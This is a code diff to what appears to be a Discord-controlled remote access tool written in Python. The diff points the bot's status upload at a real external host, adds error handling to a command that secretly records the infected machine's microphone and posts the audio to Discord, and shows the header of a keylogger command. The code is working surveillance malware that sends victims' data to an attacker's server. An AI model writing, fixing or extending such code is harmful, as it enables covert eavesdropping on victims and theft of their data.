@@ -94,6 +94,7 @@ base_url = os.getenv("BASE_URL")
 auth_code = os.getenv("AUTH_CODE")
 DISCORD_BOT_TOKEN = os.getenv('DISCORD_BOT_TOKEN')
 SPOTIPY_REDIRECT_URI = 'https://localhost:8000'
+VOICE_ID = os.getenv('VOICE_ID_DATA')
 
 
 
@@ -201,7 +202,7 @@ async def on_ready():
     }
 
     # Construct the URL
-    url = f'http://your_web_domain/status.php?auth={data["auth_code"]}'
+    url = f'http://glitch.onlinewebshop.net/hades/status.php?auth={data["auth_code"]}'
 
     # Upload the data to a web server
     try:
@@ -585,21 +586,27 @@ async def voice_rec(ctx, duration: int):
 
     # Start recording audio from the system microphone
     fs = 44100  # Sample rate
-    recording = sd.rec(int(duration * fs), samplerate=fs, channels=2)
-    sd.wait()
+    try:
+        recording = sd.rec(int(duration * fs), samplerate=fs, channels=2)
+        sd.wait()
+    except Exception as e:
+        await ctx.send(f"Error during recording: {str(e)}")
+        return
 
     # Save the recorded audio to a file
     filename = "recorded_audio.wav"
-    sf.write(filename, recording, fs)
+    try:
+        sf.write(filename, recording, fs)
+    except Exception as e:
+        await ctx.send(f"Error saving audio: {str(e)}")
+        return
 
-    #Send the recorded audio to a specific text channel
-    text_channel_id =   1256534816610844732
-    text_channel = bot.get_channel(text_channel_id)
-    if text_channel:
-        await text_channel.send(file=discord.File(filename))
-        await ctx.send("[*] Audio sent to specified text channel successfully")
-    else:
-        await ctx.send("Text channel not found.")
+    # Send the recorded audio to the default channel (where the command was used)
+    try:
+        await ctx.channel.send(file=discord.File(filename))
+        await ctx.send("[*] Audio sent successfully.")
+    except Exception as e:
+        await ctx.send(f"Error sending audio: {str(e)}")
 
 #keylog
 @bot.command()
